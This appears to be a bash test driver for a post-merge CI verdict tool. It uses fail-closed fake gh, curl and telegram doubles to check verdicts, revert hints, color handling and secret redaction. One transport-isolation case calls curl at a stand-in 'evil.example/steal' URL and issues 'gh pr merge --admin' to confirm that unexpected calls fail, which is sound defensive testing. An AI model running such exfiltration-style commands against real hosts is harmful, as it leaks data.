#!/usr/bin/env bash
# saikit-postmerge driver — real tools/saikit-postmerge.sh on local Git/origin
# with strict gh/curl/telegram doubles. Mode: simulated. Never calls live
# transports; unexpected forms fail. Does not execute the revert it reports.
set -euo pipefail
driver_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
skill_root="$(cd "$driver_dir/../.." && pwd)"
# shellcheck source=../lib/runtime.sh
. "$skill_root/scripts/lib/runtime.sh"
# shellcheck source=../lib/driver.sh
. "$skill_root/scripts/lib/driver.sh"

: "${VERIFY_HOME:?}" "${VERIFY_REPO:?}" "${VERIFY_TMPDIR:?}"
: "${SAIKIT_FM_ATTEMPT_DIR:?}"

POST="$VERIFY_REPO/tools/saikit-postmerge.sh"
FAKEBIN="$VERIFY_TMPDIR/pm-bin"
FIX="$VERIFY_TMPDIR/pm-fix"
WORK="$VERIFY_TMPDIR/pm-work"
ORIGIN="$VERIFY_TMPDIR/pm-origin.git"
WRAP="$VERIFY_TMPDIR/pm-wrap.sh"
GH_LOG="$VERIFY_TMPDIR/pm-gh.log"
CURL_LOG="$VERIFY_TMPDIR/pm-curl.log"
TG_LOG="$VERIFY_TMPDIR/pm-tg.log"

# Literal 0/1 so mutants can flip them with sed.
SAIKIT_FM_AUTO_REVERT=0
SAIKIT_FM_ISOLATE_TRANSPORT=1
# 20.3: 1 hereda CLICOLOR_FORCE=1 al tool (el doble de gh colorea entonces).
SAIKIT_FM_FORCE_COLOR=0

MC=""
# Rama que construye el fixture (la config del repo la fija pm_reset y el
# hint del tool la repite): una sola fuente para correr y para afirmar.
RAMA="master"
OUT=""
RC=0

gitr() {
  git -C "$WORK" \
    -c user.email='op@example.com' -c user.name='op' \
    -c commit.gpgsign=false \
    "$@"
}

install_fakes() {
  mkdir -p "$FAKEBIN" "$FIX"
  cat > "$FAKEBIN/gh" <<'GHEOF'
#!/usr/bin/env bash
set -u
[ -n "${SAIKIT_GH_LOG:-}" ] && printf 'gh %s\n' "$*" >> "$SAIKIT_GH_LOG"
fix="${SAIKIT_GH_FIX:?}"
  case "$1 $2" in
  "run list")
    # Contrato medido de gh (2.98.0, ver tests/test_saikit_postmerge.sh):
    # CLICOLOR_FORCE=1 heredado colorea incluso a un pipe y le gana a
    # NO_COLOR. Si el falso respondiera siempre limpio, el caso
    # postmerge-no-color no discriminaria el neutralizado del tool.
    if [ "${CLICOLOR_FORCE:-0}" = 1 ]; then
      printf '\033[1;34m'
      cat "$fix/runs.json"
      printf '\033[0m'
    else
      cat "$fix/runs.json"
    fi
    exit 0 ;;
esac
printf 'gh-falso: forma no soportada: %s\n' "$*" >&2
exit 1
GHEOF
  cat > "$FAKEBIN/curl" <<'CURLEOF'
#!/usr/bin/env bash
set -u
url=""
for a in "$@"; do
  case "$a" in
    http://*|https://*) url="$a" ;;
  esac
done
allow="${SAIKIT_CURL_ALLOW:-}"
if [ -z "$allow" ] || [ -z "$url" ] || [ "$url" != "$allow" ]; then
  printf 'curl-falso: url no prevista: %s\n' "${url:-ninguna}" >&2
  [ -n "${SAIKIT_CURL_LOG:-}" ] && printf 'curl %s\n' "$*" >> "$SAIKIT_CURL_LOG"
  exit 1
fi
printf '%s' "${SAIKIT_CURL_CODIGO:-200}"
[ -n "${SAIKIT_CURL_LOG:-}" ] && printf 'curl %s\n' "$*" >> "$SAIKIT_CURL_LOG"
exit "${SAIKIT_CURL_RC:-0}"
CURLEOF
  cat > "$FAKEBIN/telegram-send" <<'TGEOF'
#!/usr/bin/env bash
set -u
if [ "${SAIKIT_TG_ALLOW:-}" != "1" ]; then
  printf 'telegram-falso: envio no previsto\n' >&2
  exit 1
fi
printf '%s\n' "$*" >> "${SAIKIT_TG_LOG:?}"
exit "${SAIKIT_TG_RC:-0}"
TGEOF
  chmod +x "$FAKEBIN/gh" "$FAKEBIN/curl" "$FAKEBIN/telegram-send"
}

install_inherited_stubs() {
  local d="$VERIFY_TMPDIR/pm-inh"
  mkdir -p "$d"
  : > "$VERIFY_TMPDIR/pm-inh.log"
  for name in gh curl telegram-send; do
    cat > "$d/$name" <<EOF
#!/usr/bin/env bash
printf 'INHERITED %s %s\n' "$name" "\$*" >> "$VERIFY_TMPDIR/pm-inh.log"
printf 'inherited-sentinel: %s no previsto\n' "$name" >&2
exit 1
EOF
    chmod +x "$d/$name"
  done
}

write_wrapper() {
  local path_line color_line
  if [ "$SAIKIT_FM_ISOLATE_TRANSPORT" = 1 ]; then
    path_line="export PATH=\"$FAKEBIN:\$PATH\""
  else
    # Mutant path: do not prepend the case doubles. Fail-closed stubs stand
    # in for inherited host transports so a live gh/curl is never reached.
    install_inherited_stubs
    path_line="export PATH=\"$VERIFY_TMPDIR/pm-inh:\$PATH\""
  fi
  if [ "$SAIKIT_FM_FORCE_COLOR" = 1 ]; then
    color_line="export CLICOLOR_FORCE=1"
  else
    color_line=":"
  fi
  cat > "$WRAP" <<EOF
#!/usr/bin/env bash
set -u
$path_line
$color_line
export SAIKIT_GH_FIX="$FIX"
export SAIKIT_GH_LOG="$GH_LOG"
export SAIKIT_CURL_LOG="$CURL_LOG"
export SAIKIT_TG_LOG="$TG_LOG"
export SAIKIT_POSTMERGE_TIMEOUT_SEG=0
export SAIKIT_POSTMERGE_SALUD_SEG=2
export SAIKIT_CURL_CODIGO="${SAIKIT_CURL_CODIGO:-200}"
export SAIKIT_CURL_RC="${SAIKIT_CURL_RC:-0}"
export SAIKIT_CURL_ALLOW="${SAIKIT_CURL_ALLOW:-}"
export SAIKIT_TG_ALLOW="${SAIKIT_TG_ALLOW:-}"
export SAIKIT_TG_RC="${SAIKIT_TG_RC:-0}"
unset SAIKIT_CURL_BIN SAIKIT_TELEGRAM_BIN
exec bash "$POST" "\$@"
EOF
  chmod +x "$WRAP"
}

pm_reset() {
  local salud="${1:-}" tg="${2:-false}"
  rm -rf "$WORK" "$ORIGIN"
  mkdir -p "$FIX"
  git init --bare -q "$ORIGIN"
  git clone -q "$ORIGIN" "$WORK" 2>/dev/null
  gitr symbolic-ref HEAD refs/heads/master
  gitr config user.email op@example.com
  gitr config user.name op
  gitr config commit.gpgsign false
  gitr config "url.$ORIGIN.insteadOf" "https://github.com/op/sandbox.git"
  gitr remote set-url origin "https://github.com/op/sandbox.git"

  local salud_json
  if [ -n "$salud" ]; then
    salud_json="\"$salud\""
  else
    salud_json="null"
  fi
  mkdir -p "$WORK/.saikit"
  printf '{"merge":true,"merge_despliega":"no","salud_url":%s,"revert_si_rojo":true,"rama":"master","sin_verify_app":false,"telegram":%s}\n' \
    "$salud_json" "$tg" > "$WORK/.saikit/autopilot.json"
  printf 'base\n' > "$WORK/app.sh"
  gitr add .saikit/autopilot.json app.sh
  gitr commit -qm "chore: base"
  gitr push -q origin master

  gitr checkout -qb feat/task
  printf 'task\n' >> "$WORK/app.sh"
  gitr commit -qam "feat: task"
  local sha_feat
  sha_feat="$(gitr rev-parse HEAD)"
  gitr checkout -q master
  gitr merge -q --squash feat/task
  gitr commit -qm "feat: task (#7)" -m "Saikit-Merge: $sha_feat"
  gitr push -q origin master
  MC="$(gitr rev-parse HEAD)"

  : > "$GH_LOG"
  : > "$CURL_LOG"
  : > "$TG_LOG"
  printf '[{"event":"push","status":"completed","conclusion":"success","workflow":"ci"}]' \
    > "$FIX/runs.json"
  write_wrapper
}

arbol_huella() {
  gitr rev-parse HEAD
  gitr status --porcelain
  gitr log --oneline -3
}

correr() {
  write_wrapper
  set +e
  OUT="$(runtime_exec "$WORK" bash "$WRAP" --merge-commit "$MC" --rama "$RAMA")"
  RC=$?
  set -e
}

contains() {
  printf '%s' "$1" | grep -Fq -- "$2"
}

install_fakes

if fm_only postmerge-green; then
  pm_reset
  correr
  fm_action postmerge-green act-green "$RC" "$OUT" bash "$POST" --merge-commit "$MC" --rama master
  if [ "$RC" -eq 0 ]; then
    fm_pass postmerge-green tool_exit_0 "0" "exit $RC"
  else
    fm_fail postmerge-green tool_exit_0 "0" "exit $RC: $OUT"
  fi
  if contains "$OUT" "VERDE"; then
    fm_pass postmerge-green verdict_verde "VERDE" "VERDE"
  else
    fm_fail postmerge-green verdict_verde "VERDE" "$OUT"
  fi
  if contains "$OUT" "PARA REVERTIR"; then
    fm_fail postmerge-green no_revert_offered "sin PARA REVERTIR" "ofrecio revert"
  else
    fm_pass postmerge-green no_revert_offered "sin PARA REVERTIR" "sin PARA REVERTIR"
  fi
fi

if fm_only postmerge-red; then
  pm_reset
  printf '[{"event":"push","status":"completed","conclusion":"failure","workflow":"ci"}]' \
    > "$FIX/runs.json"
  antes="$(arbol_huella)"
  correr
  if [ "$SAIKIT_FM_AUTO_REVERT" = 1 ]; then
    gitr revert --no-edit "$MC" >/dev/null 2>&1 || true
  fi
  despues="$(arbol_huella)"
  fm_action postmerge-red act-red "$RC" "$OUT" bash "$POST" --merge-commit "$MC" --rama master
  if [ "$RC" -eq 1 ]; then
    fm_pass postmerge-red tool_exit_1 "1" "exit $RC"
  else
    fm_fail postmerge-red tool_exit_1 "1" "exit $RC: $OUT"
  fi
  # assert:verdict_rojo
  if contains "$OUT" "ROJO"; then
    fm_pass postmerge-red verdict_rojo "ROJO" "ROJO"
  else
    fm_fail postmerge-red verdict_rojo "ROJO" "$OUT"
  fi
  # assert:verdict_rojo_end
  # assert:revert_cmd
  if contains "$OUT" "PARA REVERTIR" && contains "$OUT" "--revert-de $MC"; then
    fm_pass postmerge-red revert_cmd "PARA REVERTIR --revert-de" "PARA REVERTIR --revert-de $MC"
  else
    fm_fail postmerge-red revert_cmd "PARA REVERTIR --revert-de" "$OUT"
  fi
  # assert:revert_cmd_end
  # assert:tree_intact
  if [ "$antes" = "$despues" ] && ! printf '%s' "$despues" | grep -qi 'revert'; then
    fm_pass postmerge-red tree_intact "HEAD/worktree intactos" "HEAD/worktree intactos"
  else
    fm_fail postmerge-red tree_intact "HEAD/worktree intactos" "arbol cambio"
  fi
  # assert:tree_intact_end
fi

if fm_only postmerge-pending; then
  pm_reset
  printf '[{"event":"push","status":"in_progress","conclusion":null,"workflow":"ci"}]' \
    > "$FIX/runs.json"
  correr
  fm_action postmerge-pending act-pend "$RC" "$OUT" bash "$POST" --merge-commit "$MC" --rama master
  if [ "$RC" -eq 3 ]; then
    fm_pass postmerge-pending tool_exit_3 "3" "exit $RC"
  else
    fm_fail postmerge-pending tool_exit_3 "3" "exit $RC: $OUT"
  fi
  if contains "$OUT" "UNKNOWN"; then
    fm_pass postmerge-pending verdict_unknown "UNKNOWN" "UNKNOWN"
  else
    fm_fail postmerge-pending verdict_unknown "UNKNOWN" "$OUT"
  fi
  if contains "$OUT" "pendiente"; then
    fm_pass postmerge-pending unknown_pendiente "pendiente" "pendiente"
  else
    fm_fail postmerge-pending unknown_pendiente "pendiente" "$OUT"
  fi
fi

if fm_only postmerge-no-run; then
  pm_reset
  printf '[]' > "$FIX/runs.json"
  correr
  fm_action postmerge-no-run act-norun "$RC" "$OUT" bash "$POST" --merge-commit "$MC" --rama master
  if [ "$RC" -eq 3 ]; then
    fm_pass postmerge-no-run tool_exit_3 "3" "exit $RC"
  else
    fm_fail postmerge-no-run tool_exit_3 "3" "exit $RC: $OUT"
  fi
  if contains "$OUT" "UNKNOWN"; then
    fm_pass postmerge-no-run verdict_unknown "UNKNOWN" "UNKNOWN"
  else
    fm_fail postmerge-no-run verdict_unknown "UNKNOWN" "$OUT"
  fi
  if contains "$OUT" "sin run"; then
    fm_pass postmerge-no-run unknown_sin_run "sin run" "sin run"
  else
    fm_fail postmerge-no-run unknown_sin_run "sin run" "$OUT"
  fi
fi

# Disciplina one-hint-per-case (ver ficha): el hint de CI pendiente se afirma
# en su PROPIO caso — una regresion en el texto del hint no debe quedar
# enmascarada por el caso del otro hint. Lo afirmado es el comando EJECUTABLE
# COMPLETO: la linea del hint dicta `bash tools/saikit-postmerge.sh
# --merge-commit $MC --rama $RAMA` (20fix B5: sin el SHA el prefijo suelto
# no es un comando que el caso pueda re-ejecutar).
if fm_only postmerge-hint-pendiente; then
  pm_reset
  printf '[{"event":"push","status":"in_progress","conclusion":null,"workflow":"ci"}]' \
    > "$FIX/runs.json"
  correr
  fm_action postmerge-hint-pendiente act-hint-pend "$RC" "$OUT" \
    bash "$POST" --merge-commit "$MC" --rama "$RAMA"
  if [ "$RC" -eq 3 ]; then
    fm_pass postmerge-hint-pendiente tool_exit_3 "3" "exit $RC"
  else
    fm_fail postmerge-hint-pendiente tool_exit_3 "3" "exit $RC: $OUT"
  fi
  # assert:hint_pendiente_ejecutable
  # 20fix r5 (C3): mismo idioma que setup B3 — el comando se EXTRAE de la
  # linea del hint (grep -F del prefijo, primera linea, sin la prosa que
  # precede al comando ni sangria; `|| true` blinda el pipeline vacio bajo
  # set -o pipefail) y se exige IGUALDAD EXACTA de linea. El contains era
  # SUBCADENA: un comando correcto seguido de ` --flag-inexistente` (rc=2 de
  # uso si se ejecutara de verdad) pasaba la asercion.
  hint_pend="$(printf '%s' "$OUT" | grep -F 'bash tools/saikit-postmerge.sh' \
    | head -1 | sed 's/^.*bash tools\/saikit-postmerge\.sh/bash tools\/saikit-postmerge.sh/;s/^[[:space:]]*//;s/[[:space:]]*$//' || true)"
  hint_pend_ok="bash tools/saikit-postmerge.sh --merge-commit $MC --rama $RAMA"
  if [ "$hint_pend" = "$hint_pend_ok" ]; then
    fm_pass postmerge-hint-pendiente hint_pendiente_ejecutable \
      "$hint_pend_ok" "hint exacto y ejecutable: [$hint_pend]"
  else
    fm_fail postmerge-hint-pendiente hint_pendiente_ejecutable \
      "$hint_pend_ok" "forma del hint inesperada: [${hint_pend:-ausente}] en: $OUT"
  fi
  # assert:hint_pendiente_ejecutable_end
fi

# one-hint-per-case: el hint de "sin run aun" en su propio caso.
if fm_only postmerge-hint-sin-run; then
  pm_reset
  printf '[]' > "$FIX/runs.json"
  correr
  fm_action postmerge-hint-sin-run act-hint-sinrun "$RC" "$OUT" \
    bash "$POST" --merge-commit "$MC" --rama "$RAMA"
  if [ "$RC" -eq 3 ]; then
    fm_pass postmerge-hint-sin-run tool_exit_3 "3" "exit $RC"
  else
    fm_fail postmerge-hint-sin-run tool_exit_3 "3" "exit $RC: $OUT"
  fi
  # assert:hint_sin_run_ejecutable
  # 20fix r5 (C3): igualdad EXACTA de linea, como hint_pendiente (contains
  # aceptaba sufijos que el tool rechazaria con rc=2 de uso).
  hint_sinrun="$(printf '%s' "$OUT" | grep -F 'bash tools/saikit-postmerge.sh' \
    | head -1 | sed 's/^.*bash tools\/saikit-postmerge\.sh/bash tools\/saikit-postmerge.sh/;s/^[[:space:]]*//;s/[[:space:]]*$//' || true)"
  hint_sinrun_ok="bash tools/saikit-postmerge.sh --merge-commit $MC --rama $RAMA"
  if [ "$hint_sinrun" = "$hint_sinrun_ok" ]; then
    fm_pass postmerge-hint-sin-run hint_sin_run_ejecutable \
      "$hint_sinrun_ok" "hint exacto y ejecutable: [$hint_sinrun]"
  else
    fm_fail postmerge-hint-sin-run hint_sin_run_ejecutable \
      "$hint_sinrun_ok" "forma del hint inesperada: [${hint_sinrun:-ausente}] en: $OUT"
  fi
  # assert:hint_sin_run_ejecutable_end
fi

# 20.3: CLICOLOR_FORCE=1 heredado no degrada el veredicto — el tool lo
# neutraliza antes de la primera captura de gh. El doble de gh colorea bajo
# CLICOLOR_FORCE (contrato medido), asi que sin neutralizacion el parser
# estricto muere con el primer ESC y el caso baja a UNKNOWN (rojo).
if fm_only postmerge-no-color; then
  SAIKIT_FM_FORCE_COLOR=1
  pm_reset
  correr
  SAIKIT_FM_FORCE_COLOR=0
  fm_action postmerge-no-color act-color "$RC" "$OUT" \
    bash "$POST" --merge-commit "$MC" --rama master
  # assert:verde_con_clicolor_force
  if [ "$RC" -eq 0 ] && contains "$OUT" "VERDE"; then
    fm_pass postmerge-no-color verde_con_clicolor_force \
      "VERDE con CLICOLOR_FORCE=1" "exit $RC VERDE pese al color heredado"
  else
    fm_fail postmerge-no-color verde_con_clicolor_force \
      "VERDE con CLICOLOR_FORCE=1" "exit $RC: $OUT"
  fi
  # assert:verde_con_clicolor_force_end
  # assert:sin_ansi_salida
  if printf '%s' "$OUT" | LC_ALL=C grep -q "$(printf '\033')\["; then
    fm_fail postmerge-no-color sin_ansi_salida "sin ESC[" "salida con bytes ANSI"
  else
    fm_pass postmerge-no-color sin_ansi_salida "sin ESC[" "sin bytes de escape"
  fi
  # assert:sin_ansi_salida_end
fi

if fm_only postmerge-redacted; then
  local_secret='https://usr:synthetic-redact-probe@example.com/salud'
  pm_reset "$local_secret" true
  export SAIKIT_CURL_CODIGO=500
  export SAIKIT_CURL_ALLOW="$local_secret"
  export SAIKIT_TG_ALLOW=1
  printf '[{"event":"push","status":"completed","conclusion":"failure","workflow":"ci"}]' \
    > "$FIX/runs.json"
  correr
  unset SAIKIT_CURL_CODIGO SAIKIT_CURL_ALLOW SAIKIT_TG_ALLOW
  fm_action postmerge-redacted act-redact "$RC" "redacted-log" bash "$POST" --merge-commit "$MC" --rama master
  tg="$(cat "$TG_LOG" 2>/dev/null || true)"
  # assert:secret_redacted
  if contains "$OUT" "[REDACTED]" && contains "$tg" "[REDACTED]"; then
    fm_pass postmerge-redacted secret_redacted "[REDACTED]" "[REDACTED]"
  else
    fm_fail postmerge-redacted secret_redacted "[REDACTED]" "sin redaccion"
  fi
  # assert:secret_redacted_end
  # assert:raw_secret_absent
  if contains "$OUT" "synthetic-redact-probe" || contains "$tg" "synthetic-redact-probe"; then
    fm_fail postmerge-redacted raw_secret_absent "ausente" "secreto crudo"
  else
    fm_pass postmerge-redacted raw_secret_absent "ausente" "ausente"
  fi
  # assert:raw_secret_absent_end
fi

if fm_only postmerge-transport; then
  pm_reset
  correr
  fm_action postmerge-transport act-green-transport "$RC" "$OUT" bash "$POST" --merge-commit "$MC" --rama master
  set +e
  ugh="$("$FAKEBIN/gh" pr merge --admin 2>&1)"
  ugh_rc=$?
  ucurl="$("$FAKEBIN/curl" -sS -- "https://evil.example/steal" 2>&1)"
  ucurl_rc=$?
  utg="$("$FAKEBIN/telegram-send" --broadcast pwn 2>&1)"
  utg_rc=$?
  set -e
  if [ "$ugh_rc" -ne 0 ]; then
    fm_pass postmerge-transport unexpected_gh_fails "gh imprevisto fallo" "gh imprevisto fallo"
  else
    fm_fail postmerge-transport unexpected_gh_fails "gh imprevisto fallo" "$ugh"
  fi
  if [ "$ucurl_rc" -ne 0 ]; then
    fm_pass postmerge-transport unexpected_curl_fails "curl imprevisto fallo" "curl imprevisto fallo"
  else
    fm_fail postmerge-transport unexpected_curl_fails "curl imprevisto fallo" "$ucurl"
  fi
  if [ "$utg_rc" -ne 0 ]; then
    fm_pass postmerge-transport unexpected_tg_fails "telegram imprevisto fallo" "telegram imprevisto fallo"
  else
    fm_fail postmerge-transport unexpected_tg_fails "telegram imprevisto fallo" "$utg"
  fi
  ghlog="$(cat "$GH_LOG" 2>/dev/null || true)"
  if printf '%s' "$ghlog" | grep -q 'run list' \
    && ! printf '%s' "$ghlog" | grep -Eq 'pr merge|api |auth '; then
    fm_pass postmerge-transport only_expected_calls "solo llamadas previstas" "solo llamadas previstas"
  else
    fm_fail postmerge-transport only_expected_calls "solo llamadas previstas" "$ghlog"
  fi
fi

exit 0
